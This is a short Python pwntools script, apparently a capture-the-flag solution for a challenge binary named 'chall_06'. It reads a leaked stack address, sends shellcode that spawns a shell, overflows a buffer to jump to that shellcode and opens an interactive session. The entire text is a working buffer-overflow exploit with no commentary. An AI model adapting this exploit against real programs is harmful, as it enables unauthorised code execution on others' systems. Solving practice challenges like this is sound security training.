# coding: utf-8
from pwn import *
p=process("./chall_06")
resp=p.recv()
leak = int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16)
context.arch = "amd64"
p.sendline(b""+asm(shellcraft.sh()))
p.recv()
p.sendline((0x40-0x8)*b"A"+p64(leak))
p.interactive()
